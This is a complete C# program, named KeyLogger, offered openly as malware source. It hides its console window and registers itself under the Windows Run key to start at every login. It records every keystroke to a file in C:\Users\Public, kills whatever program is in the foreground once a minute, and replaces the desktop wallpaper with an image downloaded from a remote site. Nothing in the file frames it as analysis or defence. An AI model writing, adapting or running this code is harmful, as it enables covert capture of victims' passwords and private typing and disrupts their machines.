using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net;

namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int Handle, int showState);

        [DllImport("kernel32.dll")]
        public static extern int GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(
                                int uAction, int uParam,
                                string lpvParam, int fuWinIni);
        public const int SPI_SETDESKWALLPAPER = 20;
        public const int SPIF_SENDCHANGE = 0x2;
        

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            ShowWindow(handle, 0);
            MakeKey();
            new Thread(new ThreadStart(StartLogging)).Start();
            new Thread(new ThreadStart(killwindow)).Start();
            getImage();
            setDesktop();
        }

        static void getImage()
        {
            string localFilename = @"tofile.jpg";
            using (WebClient client = new WebClient())
            {
                client.DownloadFile("http://wallgans.com/wp-content/uploads/2015/02/cute-and-lovely-cat-wallpapers-animals-images-cat-wallpaper.jpg", localFilename);
            }
        }

        static void setDesktop()
        {
            int result = SystemParametersInfo(SPI_SETDESKWALLPAPER,
                   1, "tofile.jpg", SPIF_SENDCHANGE);
        }

        static void MakeKey()
        {
            string location = System.Reflection.Assembly.GetExecutingAssembly().Location;
            Microsoft.Win32.RegistryKey key;
            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
            key.SetValue("Keylogger", location);
            key.Close();
            return;
        }

        static void killwindow()
        {
            while (true)
            {
                Thread.Sleep(60000);
                IntPtr hwnd = GetForegroundWindow();
                uint pid;
                GetWindowThreadProcessId(hwnd, out pid);
                Process p = Process.GetProcessById((int)pid);
                p.Kill();
                setDesktop();
            }
        }

        static void StartLogging()
        {
            while (true)
            {
                //sleeping for while, this will reduce load on cpu
                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\Users\Public\keys.txt", true))
                        {
                            file.Write((Keys)i);
                        }
                        break;
                    }
                }
            }
        }
    }
}